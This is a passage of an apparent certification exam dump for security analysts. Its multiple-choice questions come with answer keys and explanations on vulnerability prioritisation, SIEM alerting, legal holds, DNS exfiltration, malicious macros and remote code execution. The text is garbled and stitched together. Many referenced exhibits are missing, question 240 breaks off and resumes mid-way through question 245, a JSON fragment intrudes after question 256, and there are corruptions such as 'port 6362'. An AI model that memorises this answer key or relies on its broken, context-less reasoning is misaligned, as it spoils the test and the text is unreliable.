with the prior analyst.  \nB. Accept all findings and continue to investigate the next item target.  \nC. Review the steps that the previous analyst followed.  \nD. Validate the root cause from the prior analyst.  \n  \nAnswer: C Explanation:  \nReviewing the steps that the previous analyst followed is the most important step during the \ntransition, as it ensures continuity and consistency of the investigation. It also helps the new \nanalyst to understand the current status, scope, and findings of the investigation, and to avoid \nrepeating the same actions or missing any important details. The other options are either less \nimportant, premature, or potentially biased.  \n  \n  \nQUESTION 222  \nA company recently removed administrator rights from all of its end user workstations. An analyst \nuses CVSSv3.1 exploitability metrics to prioritize the vulnerabilities for the workstations and \nproduces the following information:  \n  \n\n\n \n  \n  \nWhich of the following vulnerabilities should be prioritized for remediation?  \n  \nA. nessie.explosion  \nB. vote.4p  \nC. sweet.bike  \nD. great.skills  \n  \nAnswer: A  \n  \n  \nQUESTION 223  \nA recent penetration test discovered that several employees were enticed to assist attackers by \nvisiting specific websites and running downloaded files when prompted by phone calls. Which of \nthe following would best address this issue?  \n  \nA. Increasing training and awareness for all staff  \nB. Ensuring that malicious websites cannot be visited  \nC. Blocking all scripts downloaded from the internet  \nD. Disabling all staff members' ability to run downloaded applications  \n  \nAnswer: A Explanation:  \n\n\n \nIncreasing training and awareness for all staff is the best way to address the issue of employees \nbeing enticed to assist attackers by visiting specific websites and running downloaded files when \nprompted by phone calls. This issue is an example of social engineering, which is a technique \nthat exploits human psychology and behavior to manipulate people into performing actions or \ndivulging information that benefit the attackers. Social engineering can take many forms, such as \nphishing, vishing, baiting, quid pro quo, or impersonation. The best defense against social \nengineering is to educate and train the staff on how to recognize and avoid common social \nengineering tactics, such as:  \nVerifying the identity and legitimacy of the caller or sender before following their instructions or \nclicking on any links or attachments  \nBeing wary of unsolicited or unexpected requests for information or action, especially if they \ninvolve urgency, pressure, or threats  \nReporting any suspicious or anomalous activity to the security team or the appropriate authority \nFollowing the organization's policies and procedures on security awareness and best practices.  \n  \n  \nQUESTION 224  \nA security analyst at a company is reviewing an alert from the file integrity monitoring indicating a \nmismatch in the login. html file hash. After comparing the code with the previous version of the \npage source code, the analyst found the following code snippet added:  \n  \n  \n  \nWhich of the following best describes the activity the analyst has observed?  \n  \nA. Obfuscated links  \nB. Exfiltration  \nC. Unauthorized changes  \nD. Beaconing  \n  \nAnswer: B  \n  \n  \nQUESTION 225  \nA security administrator has been notified by the IT operations department that some vulnerability \nreports contain an incomplete list of findings. Which of the following methods should be used to \nresolve this issue?  \n  \nA. Credentialed scar  \nB. External scan  \nC. Differential scan  \nD. Network scan  \n  \nAnswer: A Explanation:  \n\n\n \nA credentialed scan is a type of vulnerability scan that uses valid credentials to log in to the \nscanned systems and perform a more thorough and accurate assessment of their vulnerabilities. \nA credentialed scan can access more information than a non-credentialed scan, such as registry \nkeys, patch levels, configuration settings, and installed applications. A credentialed scan can also \nreduce the number of false positives and false negatives, as it can verify the actual state of the \nsystem rather than relying on inference or assumptions. The other types of scans are not related \nto the issue of incomplete findings, as they refer to different aspects of vulnerability scanning, \nsuch as the scope, location, or frequency of the scan. An external scan is a scan that is \nperformed from outside the network perimeter, usually from the internet. An external scan can \nreveal how an attacker would see the network and what vulnerabilities are exposed to the public. \nAn external scan cannot access internal systems or resources that are behind firewalls or other \nsecurity controls. A differential scan is a scan that compares the results of two scans and \nhighlights the differences between them. A differential scan can help identify changes in the \nnetwork environment, such as new vulnerabilities, patched vulnerabilities, or new devices. A \ndifferential scan does not provide a complete list of findings by itself, but rather a summary of \nchanges. A network scan is a scan that focuses on the network layer of the OSI model and \ndetects vulnerabilities related to network devices, protocols, services, and configurations. A \nnetwork scan can discover open ports, misconfigured firewalls, unencrypted traffic, and other \nnetwork-related issues. A network scan does not provide information about the application layer \nor the host layer of the OSI model, such as web applications or operating systems.  \n  \n  \nQUESTION 226  \nAn organization enabled a SIEM rule to send an alert to a security analyst distribution list when \nten failed logins occur within one minute. However, the control was unable to detect an attack \nwith nine failed logins. Which of the following best represents what occurred?  \n  \nA. False positive  \nB. True negative  \nC. False negative  \nD. True positive  \n  \nAnswer: C  \nExplanation:  \nA false negative is a situation where an attack or a threat is not detected by a security control, \neven though it should have been. In this case, the SIEM rule was unable to detect an attack with \nnine failed logins, which is below the threshold of ten failed logins that triggers an alert. This \nmeans that the SIEM rule missed a potential attack and failed to alert the security analysts, \nresulting in a false negative.  \n  \n  \nQUESTION 227  \nA cybersecurity analyst is tasked with scanning a web application to understand where the scan \nwill go and whether there are URIs that should be denied access prior to more in-depth scanning. \nWhich of following best fits the type of scanning activity requested?  \n  \nA. Uncredentialed scan  \nB. Discovery scan  \nC. Vulnerability scan  \nD. Credentialed scan  \n  \nAnswer: B Explanation:  \n\n\n \nA discovery scan is a type of web application scanning that involves identifying active, \ninternetfacing web applications and their URIs, without performing any intrusive or in-depth tests. \nThis type of scan can help to understand the scope and structure of a web application before \nconducting more comprehensive vulnerability scans.  \n  \n  \nQUESTION 228  \nWhich of the following best describes the process of requiring remediation of a known threat \nwithin a given time frame?  \n  \nA. SLA  \nB. MOU  \nC. Best-effort patching  \nD. Organizational governance  \n  \nAnswer: A Explanation:  \nAn SLA (Service Level Agreement) is a contract or agreement between a service provider and a \ncustomer that defines the expected level of service, performance, quality, and availability of the \nservice. An SLA also specifies the responsibilities, obligations, and penalties for both parties in \ncase of non-compliance or breach of the agreement. An SLA can help organizations to ensure \nthat their security services are delivered in a timely and effective manner, and that any security \nincidents or vulnerabilities are addressed and resolved within a specified time frame. An SLA can \nalso help to establish clear communication, expectations, and accountability between the service \nprovider and the customer.  \nAn MOU (Memorandum of Understanding) is a document that expresses a mutual agreement or \nunderstanding between two or more parties on a common goal or objective. An MOU is not \nlegally binding, but it can serve as a basis for future cooperation or collaboration. An MOU may \nnot be suitable for requiring remediation of a known threat within a given time frame, as it does \nnot have the same level of enforceability, specificity, or measurability as an SLA. Best-effort \npatching is an informal and ad hoc approach to applying security patches or updates to systems \nor software. Best-effort patching does not follow any defined process, policy, or schedule, and \nrelies on the availability and discretion of the system administrators or users. Best-effort patching \nmay not be effective or efficient for requiring remediation of a known threat within a given time \nframe, as it does not guarantee that the patches are applied correctly, consistently, or promptly. \nBest-effort patching may also introduce new risks or vulnerabilities due to human error, \ncompatibility issues, or lack of testing.  \nOrganizational governance is the framework of rules, policies, procedures, and processes that \nguide and direct the activities and decisions of an organization. Organizational governance can \nhelp to establish the roles, responsibilities, and accountabilities of different stakeholders within \nthe organization, as well as the goals, values, and principles that shape the organizational culture \nand behavior. Organizational governance can also help to ensure compliance with internal and \nexternal standards, regulations, and laws. Organizational governance may not be sufficient for \nrequiring remediation of a known threat within a given time frame, as it does not specify the \ndetails or metrics of the service delivery or performance. Organizational governance may also \nvary depending on the size, structure, and nature of the organization.  \n  \n  \nQUESTION 229  \nWhich of the following risk management principles is accomplished by purchasing cyber \ninsurance?  \n  \nA. Accept  \nB. Avoid  \n\n\n \nC. Mitigate  \nD. Transfer  \n  \nAnswer: D  \nExplanation:  \nTransfer is the risk management principle that is accomplished by purchasing cyber insurance. \nTransfer is a strategy that involves shifting the risk or its consequences to another party, such as \nan insurance company, a vendor, or a partner. Transfer does not eliminate the risk, but it reduces \nthe potential impact or liability of the risk for the original party. Cyber insurance is a type of \ninsurance that covers the losses and damages resulting from cyberattacks, such as data \nbreaches, ransomware, denial-of-service attacks, or network disruptions. Cyber insurance can \nhelp transfer the risk of cyber incidents by providing financial compensation, legal assistance, or \nrecovery services to the insured party.  \n  \nQUESTION 230  \nA recent audit of the vulnerability management program outlined the finding for increased \nawareness of secure coding practices. Which of the following would be best to address the \nfinding?  \n  \nA. Establish quarterly SDLC training on the top vulnerabilities for developers  \nB. Conduct a yearly inspection of the code repositories and provide the report to management.  \nC. Hire an external penetration test of the network  \nD. Deploy more vulnerability scanners for increased coverage  \n  \nAnswer: A  \n  \n  \nQUESTION 231  \nAn organization has deployed a cloud-based storage system for shared data that is in phase two \nof the data life cycle. Which of the following controls should the security team ensure are \naddressed? (Choose two.)  \n  \nA. Data classification  \nB. Data destruction  \nC. Data loss prevention  \nD. Encryption  \nE. Backups  \nF. Access controls  \n  \nAnswer: DF  \n  \n  \nQUESTION 232  \nAn analyst is conducting routine vulnerability assessments on the company infrastructure. When \nperforming these scans, a business-critical server crashes, and the cause is traced back to the \nvulnerability scanner. Which of the following is the cause of this issue?  \n  \nA. The scanner is running without an agent installed.  \nB. The scanner is running in active mode.  \nC. The scanner is segmented improperly  \nD. The scanner is configured with a scanning window  \n  \n\n\n \nAnswer: B Explanation:  \nThe scanner is running in active mode, which is the cause of this issue. Active mode is a type of \nvulnerability scanning that sends probes or requests to the target systems to test their responses \nand identify potential vulnerabilities. Active mode can provide more accurate and comprehensive \nresults, but it can also cause more network traffic, performance degradation, or system instability. \nIn some cases, active mode can trigger denial-of-service (DoS) conditions or crash the target \nsystems, especially if they are not configured to handle the scanning requests or if they have \nunderlying vulnerabilities that can be exploited by the scanner. Therefore, the analyst should use \ncaution when performing active mode scanning, and avoid scanning business-critical or sensitive \nsystems without proper authorization and preparation.  \n  \n  \nQUESTION 233  \nAn organization's threat intelligence team notes a recent trend in adversary privilege escalation \nprocedures. Multiple threat groups have been observed utilizing native Windows tools to bypass \nsystem controls and execute commands with privileged credentials. Which of the following \ncontrols would be most effective to reduce the rate of success of such attempts?  \n  \nA. Set user account control protection to the most restrictive level on all devices  \nB. Implement MFA requirements for all internal resources  \nC. Harden systems by disabling or removing unnecessary services  \nD. Implement controls to block execution of untrusted applications  \n  \nAnswer: D Explanation:  \nImplementing controls to block execution of untrusted applications can prevent privilege \nescalation attacks that leverage native Windows tools, such as PowerShell, WMIC, or Rundll32. \nThese tools can be used by attackers to run malicious code or commands with elevated \nprivileges, bypassing system security policies and controls. By restricting the execution of \nuntrusted applications, organizations can reduce the attack surface and limit the potential \ndamage of privilege escalation attacks.  \n  \n  \nQUESTION 234  \nA new zero-day vulnerability was released. A security analyst is prioritizing which systems should \nreceive deployment of compensating controls deployment first. The systems have been grouped \ninto the categories shown below:  \n  \n  \n  \nWhich of the following groups should be prioritized for compensating controls?  \n  \nA. Group A  \nB. Group B  \nC. Group C  \nD. Group D  \n  \n\n\n \nAnswer: A  \n  \n  \nQUESTION 235  \nA Chief Information Security Officer wants to map all the attack vectors that the company faces \neach day. Which of the following recommendations should the company align their security \ncontrols around?  \n  \nA. OSSTMM  \nB. Diamond Model of Intrusion Analysis  \nC. OWASP  \nD. MITRE ATT&CK  \n  \nAnswer: D Explanation:  \nMITRE ATT&CK is a framework that maps the tactics, techniques, and procedures (TTPs) of \nvarious threat actors and groups, based on real-world observations and dat a. MITRE ATT&CK \ncan help a Chief Information Security Officer (CISO) to map all the attack vectors that the \ncompany faces each day, as well as to align their security controls around the most relevant and \nprevalent threats. MITRE ATT&CK can also help the CISO to assess the effectiveness and \nmaturity of their security posture, as well as to identify and prioritize the gaps and improvements.  \n  \n  \nQUESTION 236  \nWhich of the following actions would an analyst most likely perform after an incident has been \ninvestigated?  \n  \nA. Risk assessment  \nB. Root cause analysis  \nC. Incident response plan  \nD. Tabletop exercise  \n  \nAnswer: B  \n  \n  \nQUESTION 237  \nAfter completing a review of network activity, the threat hunting team discovers a device on the \nnetwork that sends an outbound email via a mail client to a non-company email address daily at \n10:00 p.m. Which of the following is potentially occurring?  \n  \nA. Irregular peer-to-peer communication  \nB. Rogue device on the network  \nC. Abnormal OS process behavior  \nD. Data exfiltration  \n  \nAnswer: D Explanation:  \nData exfiltration is the theft or unauthorized transfer or movement of data from a device or \nnetwork. It can occur as part of an automated attack or manually, on-site or through an internet \nconnection, and involve various methods. It can affect personal or corporate data, such as \nsensitive or confidential information. Data exfiltration can be prevented or detected by using \ncompression, encryption, authentication, authorization, and other controls. The network activity \nshows that a device on the network is sending an outbound email via a mail client to a \nnoncompany email address daily at 10:00 p.m. This could indicate that the device is \n\n\n \ncompromised by malware or an insider threat, and that the email is used to exfiltrate data from \nthe network to an external party. The email could contain attachments, links, or hidden data that \ncontain the stolen information. The timing of the email could be designed to avoid detection by \nnormal network monitoring or security systems.  \n  \n  \nQUESTION 238  \nA vulnerability scanner generates the following output:  \n  \n  \n  \nThe company has an SLA for patching that requires time frames to be met for high-risk \nvulnerabilities. Which of the following should the analyst prioritize first for remediation?  \n  \nA. Oracle JDK  \nB. Cisco Webex  \nC. Redis Server  \nD. SSL Self-signed Certificate  \n  \nAnswer: C  \n  \n  \nQUESTION 239  \nA web application team notifies a SOC analyst that there are thousands of HTTP/404 events on \nthe public-facing web server. Which of the following is the next step for the analyst to take?  \n  \nA. Instruct the firewall engineer that a rule needs to be added to block this external server  \nB. Escalate the event to an incident and notify the SOC manager of the activity  \nC. Notify the incident response team that there is a DDoS attack occurring  \nD. Identify the IP/hostname for the requests and look at the related activity  \n  \nAnswer: D Explanation:  \nA HTTP/404 error code means that the requested page or resource was not found on the web \nserver. This could be caused by various reasons, such as incorrect URLs, moved or deleted \npages, missing assets, or server misconfigurations. The analyst should first identify the source of \nthe requests and examine the related activity to determine if they are legitimate or malicious, and \nwhat actions need to be taken to resolve the issue. The other options are either premature or \nirrelevant without further investigation.  \n  \n  \nQUESTION 240  \nSIMULATION  \n  \nApproximately 100 employees at your company have received a phishing email.

Host03 also \nhas 5 critical vulnerabilities, which are the most severe and urgent to fix, as they can allow \nremote code execution, privilege escalation, or data loss. The other hosts have lower risk scores \nand lower numbers of critical vulnerabilities, so they can be patched later.  \n  \n  \nQUESTION 246  \nA security analyst receives an alert for suspicious activity on a company laptop. An excerpt of the \nlog is shown below:  \n  \n\n\n \n  \n  \nWhich of the following has most likely occurred?  \n  \nA. An Office document with a malicious macro was opened.  \nB. A credential-stealing website was visited.  \nC. A phishing link in an email was clicked D. A web browser vulnerability was exploited.  \n  \nAnswer: A Explanation:  \nAn Office document with a malicious macro was opened is the most likely explanation for the \nsuspicious activity on the company laptop, as it reflects the common technique of using macros \nto execute PowerShell commands that download and run malware. A macro is a piece of code \nthat can automate tasks or perform actions in an Office document, such as a Word file or an \nExcel spreadsheet. Macros can be useful and legitimate, but they can also be abused by threat \nactors to deliver malware or perform malicious actions on the system. A malicious macro can be \nembedded in an Office document that is sent as an attachment in a phishing email or hosted on a \ncompromised website. When the user opens the document, they may be prompted to enable \nmacros or content, which will trigger the execution of the malicious code. The malicious macro \ncan then use PowerShell, which is a scripting language and command-line shell that is built into \nWindows, to perform various tasks, such as downloading and running malware from a remote \nURL, bypassing security controls, or establishing persistence on the system. The log excerpt \nshows that PowerShell was used to download a string from a URL using the  \nWebClient.DownloadString method, which is a common way to fetch and execute malicious code \nfrom the internet. The log also shows that PowerShell was used to invoke an expression (iex) \nthat contains obfuscated code, which is another common way to evade detection and analysis.  \n  \n  \nQUESTION 247  \nDuring an incident, a security analyst discovers a large amount of Pll has been emailed externally \nfrom an employee to a public email address. The analyst finds that the external email is the \nemployee's personal email. Which of the following should the analyst recommend be done first?  \n  \nA. Place a legal hold on the employee's mailbox.  \nB. Enable filtering on the web proxy.  \nC. Disable the public email access with CASB.  \n\n\n \nD. Configure a deny rule on the firewall.  \n  \nAnswer: A Explanation:  \nPlacing a legal hold on the employee's mailbox is the best action to perform first, as it preserves \nall mailbox content, including deleted items and original versions of modified items, for potential \nlegal or forensic purposes. A legal hold is a feature that allows an administrator to retain mailbox \ndata for a user indefinitely or for a specified period, regardless of the user's actions or retention \npolicies. A legal hold can be applied to a mailbox using Litigation Hold or In-Place Hold in \nExchange Server or Exchange Online. A legal hold can help to ensure that evidence of data \nexfiltration or other malicious activities is not lost or tampered with, and that the organization can \ncomply with any legal or regulatory obligations.  \n  \nQUESTION 248  \nAn attacker has just gained access to the syslog server on a LAN. Reviewing the syslog entries \nhas allowed the attacker to prioritize possible next targets. Which of the following is this an \nexample of?  \n  \nA. Passive network foot printing  \nB. OS fingerprinting  \nC. Service port identification  \nD. Application versioning  \n  \nAnswer: A Explanation:  \nPassive network foot printing is the best description of the example, as it reflects the technique of \ncollecting information about a network or system by monitoring or sniffing network traffic without \nsending any packets or interacting with the target. Foot printing is a term that refers to the \nprocess of gathering information about a target network or system, such as its IP addresses, \nopen ports, operating systems, services, or vulnerabilities. Foot printing can be done for \nlegitimate purposes, such as penetration testing or auditing, or for malicious purposes, such as \nreconnaissance or intelligence gathering. Foot printing can be classified into two types: active \nand passive. Active foot printing involves sending packets or requests to the target and analyzing \nthe responses, such as using tools like ping, traceroute, or Nmap. Active foot printing can provide \nmore accurate and detailed information, but it can also be detected by firewalls or intrusion \ndetection systems (IDS). Passive foot printing involves observing or capturing network traffic \nwithout sending any packets or requests to the target, such as using tools like tcpdump, \nWireshark, or Shodan. Passive foot printing can provide less information, but it can also avoid \ndetection by firewalls or IDS. The example in the question shows that the attacker has gained \naccess to the syslog server on a LAN and reviewed the syslog entries to prioritize possible next \ntargets. A syslog server is a server that collects and stores log messages from various devices or \napplications on a network. A syslog entry is a record of an event or activity that occurred on a \ndevice or application, such as an error, a warning, or an alert. By reviewing the syslog entries, the \nattacker can obtain information about the network or system, such as its configuration, status, \nperformance, or security issues. This is an example of passive network foot printing, as the \nattacker is not sending any packets or requests to the target, but rather observing or capturing \nnetwork traffic from the syslog server.  \n  \n  \nQUESTION 249  \nSeveral users received a phishing email containing a malicious file that bypassed the \norganization’s email security tool. Based on the SIEM logs, users did not open the file within the \nenvironment. In which of the following phases of the MITRE ATT&CK framework was the attack \nstopped?  \n  \n\n\n \nA. Lateral movement  \nB. Execution  \nC. Initial access  \nD. Discovery  \n  \nAnswer: B Explanation:  \nBecause the malicious file was delivered but never opened or run by any user, the attack halted \nat the point where the adversary would need to execute code on a host, so it was stopped in the \nExecution phase.  \n  \n  \nQUESTION 250  \nA security analyst has found the following suspicious DNS traffic while analyzing a packet \ncapture:  \n  \n- DNS traffic while a tunneling session is active.  \n- The mean time between queries is less than one second.  \n- The average query length exceeds 100 characters.  \n  \nWhich of the following attacks most likely occurred?  \n  \nA. DNS exfiltration  \nB. DNS spoofing  \nC. DNS zone transfer  \nD. DNS poisoning  \n  \nAnswer: A Explanation:  \nDNS exfiltration is a technique that uses the DNS protocol to transfer data from a compromised \nnetwork or device to an attacker-controlled server. DNS exfiltration can bypass firewall rules and \nsecurity products that do not inspect DNS traffic. The characteristics of the suspicious DNS traffic \nin the question match the indicators of DNS exfiltration, such as:  \nDNS traffic while a tunneling session is active: This implies that the DNS protocol is being used to \ncreate a covert channel for data transfer.  \nThe mean time between queries is less than one second: This implies that the DNS queries are \nbeing sent at a high frequency to maximize the amount of data transferred. The average query \nlength exceeds 100 characters: This implies that the DNS queries are encoding large amounts of \ndata in the subdomains or other fields of the DNS packets.  \n  \n  \nQUESTION 251  \nWhich of the following describes a contract that is used to define the various levels of \nmaintenance to be provided by an external business vendor in a secure environment?  \n  \nA. MOU  \nB. NDA  \nC. BIA  \nD. SLA  \n  \nAnswer: D Explanation:  \nSLA stands for Service Level Agreement, which is a contract that defines the various levels of \nmaintenance to be provided by an external business vendor in a secure environment. An SLA \nspecifies the expectations, responsibilities, and obligations of both parties, such as the scope, \n\n\n \nquality, availability, and performance of the service, as well as the metrics and methods for \nmeasuring and reporting the service level. An SLA also outlines the penalties or remedies for any \nbreach or failure of the service level. An SLA can help ensure that the external business vendor \ndelivers the service in a timely, consistent, and secure manner, and that the customer receives \nthe service that meets their needs and requirements.  \n  \n  \nQUESTION 252  \nDuring the log analysis phase, the following suspicious command is detected:  \n  \n  \n  \nWhich of the following is being attempted?  \n  \nA. Buffer overflow  \nB. RCE  \nC. ICMP tunneling  \nD. Smurf attack  \n  \nAnswer: B Explanation:  \nRCE stands for remote code execution, which is a type of attack that allows an attacker to \nexecute arbitrary commands on a target system. The suspicious command in the question is an \nexample of RCE, as it tries to download and execute a malicious file from a remote server using \nthe wget and chmod commands. A buffer overflow is a type of vulnerability that occurs when a \nprogram writes more data to a memory buffer than it can hold, potentially overwriting other \nmemory locations and corrupting the program's execution. ICMP tunneling is a technique that \nuses ICMP packets to encapsulate and transmit data that would normally be blocked by firewalls \nor filters. A smurf attack is a type of DDoS attack that floods a network with ICMP echo requests, \ncausing all devices on the network to reply and generate a large amount of traffic.  \n  \n  \nQUESTION 253  \nAn organization would like to ensure its cloud infrastructure has a hardened configuration. A \nrequirement is to create a server image that can be deployed with a secure template. Which of \nthe following is the best resource to ensure secure configuration?  \n  \nA. CIS Benchmarks  \nB. PCI DSS  \nC. OWASP Top Ten  \nD. ISO 27001  \n  \nAnswer: A  \nExplanation:  \nThe best resource to ensure secure configuration of cloud infrastructure is A. CIS Benchmarks. \nCIS Benchmarks are a set of prescriptive configuration recommendations for various \ntechnologies, including cloud providers, operating systems, network devices, and server \nsoftware. They are developed by a global community of cybersecurity experts and help \norganizations protect their systems against threats more confidently.  \nPCI DSS, OWASP Top Ten, and ISO 27001 are also important standards for information security, \nbut they are not focused on providing specific guidance for hardening cloud infrastructure. PCI \nDSS is a compliance scheme for payment card transactions, OWASP Top Ten is a list of  \n\n\n \ncommon web application security risks, and ISO 27001 is a framework for establishing and \nmaintaining an information security management system. These standards may have some \nrelevance for cloud security, but they are not as comprehensive and detailed as CIS \nBenchmarks.  \n  \n  \nQUESTION 254  \nA systems administrator notices unfamiliar directory names on a production server. The \nadministrator reviews the directory listings and files, and then concludes the server has been \ncompromised. Which of the following steps should the administrator take next?  \n  \nA. Inform the internal incident response team.  \nB. Follow the company's incident response plan.  \nC. Review the lessons learned for the best approach.  \nD. Determine when the access started.  \n  \nAnswer: B Explanation:  \nAn incident response plan is a set of predefined procedures and guidelines that an organization \nfollows when faced with a security breach or attack. An incident response plan helps to ensure \nthat the organization can quickly and effectively contain, analyze, eradicate, and recover from the \nincident, as well as prevent or minimize the damage and impact to the business operations, \nreputation, and customers. An incident response plan also defines the roles and responsibilities \nof the incident response team, the communication channels and protocols, the escalation and \nreporting procedures, and the tools and resources available for the incident response. By \nfollowing the company's incident response plan, the administrator can ensure that they are \nfollowing the best practices and standards for handling a security incident, and that they are \ncoordinating and collaborating with the relevant stakeholders and authorities. Following the \ncompany's incident response plan can also help to avoid or reduce any legal, regulatory, or \ncontractual liabilities or penalties that may arise from the incident. The other options are not as \neffective or appropriate as following the company's incident response plan. Informing the internal \nincident response team (A) is a good step, but it should be done according to the company's \nincident response plan, which may specify who, when, how, and what to report. Reviewing the \nlessons learned for the best approach ?is a good step, but it should be done after the incident \nhas been resolved and closed, not during the active response phase. Determining when the \naccess started (D) is a good step, but it should be done as part of the analysis phase of the \nincident response plan, not before following the plan.  \n  \n  \nQUESTION 255  \nA software developer has been deploying web applications with common security risks to include \ninsufficient logging capabilities. Which of the following actions would be most effective to reduce \nrisks associated with the application development?  \n  \nA. Perform static analyses using an integrated development environment.  \nB. Deploy compensating controls into the environment.  \nC. Implement server-side logging and automatic updates.  \nD. Conduct regular code reviews using OWASP best practices.  \n  \nAnswer: D Explanation:  \nConducting regular code reviews using OWASP best practices is the most effective action to \nreduce risks associated with the application development. Code reviews are a systematic \nexamination of the source code of an application to detect and fix errors, vulnerabilities, and \nweaknesses that may compromise the security, functionality, or performance of the application. \n\n\n \nCode reviews can help to improve the quality and security of the code, as well as to identify and \nremediate common security risks, such as insufficient logging capabilities. OWASP (Open Web \nApplication Security Project) is a global nonprofit organization that provides free and open \nresources, tools, standards, and best practices for web application security. OWASP best \npractices for logging include following a common logging format and approach, logging relevant \nsecurity events and data, protecting log data from unauthorized access or modification, and using \nlog analysis and monitoring tools to detect and respond to security incidents. By following \nOWASP best practices for logging, developers can ensure that their web applications have \nsufficient and effective logging capabilities that can help to prevent, detect, and mitigate security \nthreats.  \n  \n  \nQUESTION 256  \nA security audit for unsecured network services was conducted, and the following output was \ngenerated:  \n  \n  \n  \nWhich of the following services should the security team investigate further?

        "B": "OS fingerprinting"
      },
      "answer": "C",
      "explanation": "The output shows the results of a port scan, which is a technique used to identify open ports and \nservices running on a network host. Port scanning can be used by attackers to discover potential \nvulnerabilities and exploit them, or by defenders to assess the security posture and configuration \nof their network devices.  \nThe output lists six ports that are open on the target host, along with the service name and \nversion associated with each port. The service name indicates the type of application or protocol \nthat is using the port, while the version indicates the specific release or update of the service. The \nservice name and version can provide useful information for both attackers and defenders, as \nthey can reveal the capabilities, features, and weaknesses of the service. Among the six ports \n\n\n \nlisted, two are particularly risky and should be investigated further by the security team: port 23 \nand port 636.  \nPort 23 is used by Telnet, which is an old and insecure protocol for remote login and command \nexecution. Telnet does not encrypt any data transmitted over the network, including usernames \nand passwords, which makes it vulnerable to eavesdropping, interception, and modification by \nattackers. Telnet also has many known vulnerabilities that can allow attackers to gain \nunauthorized access, execute arbitrary commands, or cause denial-of-service attacks on the \ntarget host Port 636 is used by LDAP over SSL/TLS (LDAPS), which is a protocol for accessing \nand modifying directory services over a secure connection. LDAPS encrypts the data exchanged \nbetween the client and the server using SSL/TLS certificates, which provide authentication, \nconfidentiality, and integrity. However, LDAPS can also be vulnerable to attacks if the certificates \nare not properly configured, verified, or updated. For example, attackers can use self-signed or \nexpired certificates to perform man-in-the-middle attacks, spoofing attacks, or certificate \nrevocation attacks on LDAPS connections. Therefore, the security team should investigate \nfurther why port 23 and port 636 are open on the target host, and what services are running on \nthem. The security team should also consider disabling or replacing these services with more \nsecure alternatives, such as SSH for port 23 and StartTLS for port 6362.  \n  \n  \nQUESTION 257  \nWhich of the following is often used to keep the number of alerts to a manageable level when \nestablishing a process to track and analyze violations?  \n  \nA. Log retention  \nB. Log rotation  \nC. Maximum log size  \nD. Threshold value  \n  \nAnswer: D Explanation:  \nA threshold value is a parameter that defines the minimum or maximum level of a metric or event \nthat triggers an alert. For example, a threshold value can be set to alert when the number of \nfailed login attempts exceeds 10 in an hour, or when the CPU usage drops below 20% for more \nthan 15 minutes. By setting a threshold value, the process can filter out irrelevant or insignificant \nalerts and focus on the ones that indicate a potential problem or anomaly. A threshold value can \nhelp to reduce the noise and false positives in the alert system, and improve the efficiency and \naccuracy of the analysis.  \n  \n  \nQUESTION 258  \nWhich of the following is described as a method of enforcing a security policy between cloud \ncustomers and cloud services?  \n  \nA. CASB  \nB. DMARC  \nC. SIEM  \nD. PAM  \n  \nAnswer: A Explanation:  \nA CASB (Cloud Access Security Broker) is a security solution that acts as an intermediary \nbetween cloud users and cloud providers, and monitors and enforces security policies for cloud \naccess and usage. A CASB can help organizations protect their data and applications in the \ncloud from unauthorized or malicious access, as well as comply with regulatory standards and \n\n\n \nbest practices. A CASB can also provide visibility, control, and analytics for cloud activity, and \nidentify and mitigate potential threats.  \nThe other options are not correct. DMARC (Domain-based Message Authentication, Reporting \nand Conformance) is an email authentication protocol that helps email domain owners prevent \nspoofing and phishing attacks by verifying the sender's identity and instructing the receiver how \nto handle unauthenticated messages SIEM (Security Information and Event Management) is a \nsecurity solution that collects, aggregates, and analyzes log data from various sources across an \norganization's network, such as applications, devices, servers, and users, and provides real-time \nalerts, dashboards, reports, and incident response capabilities to help security teams identify and \nmitigate cyberattacks PAM (Privileged Access Management) is a security solution that helps \norganizations manage and protect the access and permissions of users, accounts, processes, \nand systems that have elevated or administrative privileges. PAM can help prevent credential \ntheft, data breaches, insider threats, and compliance violations by monitoring, detecting, and \npreventing unauthorized privileged access to critical resources.  \n  \n  \nQUESTION 259  \nWhich of the following best describes the reporting metric that should be utilized when measuring \nthe degree to which a system application, or user base is affected by an uptime availability \noutage?  \n  \nA. Timeline  \nB. Evidence  \nC. Impact  \nD. Scope  \n  \nAnswer: C Explanation:  \nThe impact metric is the best way to measure the degree to which a system, application, or user \nbase is affected by an uptime availability outage. The impact metric quantifies the consequences \nof the outage in terms of lost revenue, productivity, reputation, customer satisfaction, or other \nrelevant factors. The impact metric can help prioritize the recovery efforts and justify the \nresources needed to restore the service.  \n  \n  \nQUESTION 260  \nA security analyst needs to provide evidence of regular vulnerability scanning on the company's \nnetwork for an auditing process. Which of the following is an example of a tool that can produce \nsuch evidence?  \n  \nA. OpenVAS  \nB. Burp Suite  \nC. Nmap  \nD. Wireshark  \n  \nAnswer: A Explanation:  \nOpenVAS is an open-source tool that performs comprehensive vulnerability scanning and \nassessment on the network. It can generate reports and evidence of the scan results, which can \nbe used for auditing purposes.  \n  \n  \nQUESTION 261  \n\n\n \nAn organization receives a legal hold request from an attorney. The request pertains to emails \nrelated to a disputed vendor contract. Which of the following is the best step for the security team \nto take to ensure compliance with the request?  \n  \nA. Publicly disclose the request to other vendors  \nB. Notify the departments involved to preserve potentially relevant information  \nC. Establish a chain of custody starting with the attorney's request  \nD. Back up the mailboxes on the server and provide the attorney with a copy  \n  \nAnswer: B Explanation:  \nThe first step for the security team when receiving a legal hold request is to notify the relevant \ndepartments to preserve all potentially relevant information. This ensures that no data is altered, \ndeleted, or otherwise tampered with, which is critical for maintaining the integrity of the evidence. \nPreserving information includes emails, documents, and any other data that might be relevant to \nthe legal matter. Establishing a chain of custody and backing up data are also important steps, \nbut notifying the involved parties is the immediate priority to prevent data loss.  \n  \n  \nQUESTION 262  \nA company has the following security requirements:  \n  \n- No public IPs  \n- All data secured at rest  \n- No insecure ports/protocols  \n  \nAfter a cloud scan is completed a security analyst receives reports that several misconfigurations \nare putting the company at risk. Given the following cloud scanner output:  \n  \n  \n  \nWhich of the following should the analyst recommend be updated first to meet the security \nrequirements and reduce risks?  \n  \nA. VM_PRD_DB  \nB. VM_DEV_DB  \nC. VM_DEV_Web02  \nD. VM_PRD_Web01  \n  \nAnswer: A Explanation:  \nIn Option A the Encryption says NO, and Port 80 is HTTP which by itself is not the problem but \nwhen the web server is serving requests over and unencrypted network, or when the data is \n\n\n \nunencrypted then... there's a problem. Also the IP is public. this violates all the rules stated \nabove.  \n  \n  \nQUESTION 263  \nWhich of the following best describes the actions taken by an organization after the resolution of \nan incident that addresses issues and reflects on the growth opportunities for future incidents?  \n  